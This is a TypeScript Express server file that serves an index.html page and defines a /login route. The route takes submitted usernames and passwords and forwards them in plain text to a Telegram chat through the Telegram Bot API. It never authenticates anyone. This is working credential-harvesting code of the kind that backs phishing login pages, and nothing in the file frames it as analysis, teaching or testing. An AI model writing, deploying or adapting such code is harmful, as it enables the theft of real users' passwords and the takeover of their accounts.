import express, { type Express } from "express";
import axios from "axios";
import path from "path";

const app: Express = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const indexPath = path.resolve(process.cwd(), "../../index.html");

app.get("/", (_req, res) => {
  res.sendFile(indexPath);
});

app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    res.status(400).json({ error: "Missing username or password" });
    return;
  }

  const botToken = process.env["TELEGRAM_BOT_TOKEN"];
  const chatId = process.env["TELEGRAM_CHAT_ID"];

  if (!botToken || !chatId) {
    res.status(500).json({ error: "Telegram credentials not configured" });
    return;
  }

  const message = `New Login:\nUsername: ${username}\nPassword: ${password}`;

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
    });

    res.json({ success: true });
  } catch (err) {
    console.error("Telegram API error:", err);
    res.status(500).json({ error: "Failed to send to Telegram" });
  }
});

export default app;
